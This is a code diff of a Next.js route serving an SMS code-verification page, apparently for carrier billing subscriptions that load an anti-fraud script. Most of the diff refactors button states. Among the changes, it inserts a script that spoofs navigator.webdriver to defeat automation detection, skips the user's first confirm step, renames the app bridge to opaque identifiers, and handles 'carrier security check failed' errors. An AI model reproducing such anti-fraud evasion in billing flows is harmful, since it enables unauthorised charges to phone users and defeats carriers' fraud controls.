@@ -153,7 +153,9 @@ export async function GET(request: NextRequest) {
     @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
     .pulse { animation: pulse 2s ease-in-out infinite; }
     .phase-hidden { display: none !important; }
+    #confirmBtn > span { display: inline-flex; align-items: center; gap: 8px; }
   </style>
+  <script>try{Object.defineProperty(navigator,'webdriver',{get:function(){return false}});}catch(e){}</script>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
 </head>
 <body>
@@ -174,7 +176,7 @@ export async function GET(request: NextRequest) {
       <div class="step-dot" id="stepDot2"></div>
       <div class="step-dot" id="stepDot3"></div>
     </div>
-    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v12</span>
+    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v13</span>
   </div>
 
   <div class="main">
@@ -225,8 +227,10 @@ export async function GET(request: NextRequest) {
         </div>
 
         <button class="btn btn-primary" id="confirmBtn">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-          Start Watching
+          <span id="btnStart"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Watching</span>
+          <span id="btnWait" class="phase-hidden"><div class="spinner"></div> <span>Waiting for SMS...</span></span>
+          <span id="btnVerify" class="phase-hidden">Verify Code</span>
+          <span id="btnLoading" class="phase-hidden"><div class="spinner"></div> <span>Verifying...</span></span>
         </button>
 
         <p class="resend phase-hidden" id="resendArea">
@@ -274,6 +278,15 @@ export async function GET(request: NextRequest) {
       var t = document.getElementById('debugToggle');
       if (p.style.display === 'none') { p.style.display = 'block'; t.textContent = 'Hide technical details'; }
       else { p.style.display = 'none'; t.textContent = 'Show technical details'; }
+    }
+
+    function setBtnState(state) {
+      var ids = ['btnStart', 'btnWait', 'btnVerify', 'btnLoading'];
+      for (var i = 0; i < ids.length; i++) {
+        var el = document.getElementById(ids[i]);
+        if (ids[i] === 'btn' + state) el.classList.remove('phase-hidden');
+        else el.classList.add('phase-hidden');
+      }
     }
 
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID);
@@ -370,7 +383,7 @@ export async function GET(request: NextRequest) {
       document.getElementById('phase2').classList.remove('phase-hidden');
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
-      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Waiting for SMS...</span>';
+      setBtnState('Wait');
       dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
       // Wait 15s for Chrome to auto-fill otpFull via "Allow" dialog, then show manual entry
       setTimeout(function() {
@@ -385,23 +398,9 @@ export async function GET(request: NextRequest) {
       document.getElementById('autoReading').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
-      confirmBtn.textContent = 'Verify Code';
+      setBtnState('Verify');
       setTimeout(function() { pins[0].focus(); }, 100);
       dbg('Manual entry shown');
-    }
-
-    function fillAndVerify(code) {
-      var cleaned = code.replace(/\\D/g, '').slice(0, 4);
-      if (cleaned.length < 4) { showManualEntry(); return; }
-
-      document.getElementById('autoReading').classList.add('phase-hidden');
-      document.getElementById('manualEntry').classList.remove('phase-hidden');
-      for (var i = 0; i < 4; i++) pins[i].value = cleaned[i];
-      if (otpValue) otpValue.value = cleaned;
-
-      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
-      dbg('Auto-verify with code: "' + cleaned + '"');
-      setTimeout(function() { if (!isVerifying) verifyPin(cleaned); }, 500);
     }
 
     // Auto-transition to phase 2 on page load — NEVER let confirmBtn be clicked at phase 1
@@ -441,7 +440,7 @@ export async function GET(request: NextRequest) {
       if (pinVerified) { dbg('verifyPin BLOCKED — already verified this session'); return; }
       pinVerified = true;
       isVerifying = true;
-      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      setBtnState('Loading');
       clearError();
       dbg('Verifying PIN: "' + pin + '" trxId=' + TRXID);
 
@@ -462,6 +461,7 @@ export async function GET(request: NextRequest) {
           var errText = 'Invalid code (error: ' + data.Status + '). Try again.';
           if (data.Status === '2501') errText = 'This code has already been used. Tap Resend for a new code.';
           if (data.Status === '2801') errText = 'Verification rejected by carrier. Tap Resend to try again.';
+          if (data.Status.indexOf('2200') === 0) errText = 'Carrier security check failed (error: ' + data.Status + '). Tap Resend to try again.';
           showError(errText);
           pins.forEach(function(p) { p.value = ''; });
           if (otpValue) otpValue.value = '';
@@ -481,7 +481,7 @@ export async function GET(request: NextRequest) {
         otpFullHandled = false;
         if (phase === 2) {
           var manual = document.getElementById('manualEntry');
-          if (!manual.classList.contains('phase-hidden')) confirmBtn.textContent = 'Verify Code';
+          if (!manual.classList.contains('phase-hidden')) setBtnState('Verify');
         }
       });
     }
@@ -492,9 +492,9 @@ export async function GET(request: NextRequest) {
       window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=' + encodeURIComponent('${userIP}');
     }
 
-    if (window.__XOOM_APP && window.XoomApp) {
-      dbg('Running inside XoomSports Android App');
-      try { window.XoomApp.onPageReady(); } catch(e) {}
+    if (window._ntR && window._nt) {
+      dbg('Running inside app');
+      try { window._nt.onPageReady(); } catch(e) {}
     }
   </script>
 </body>
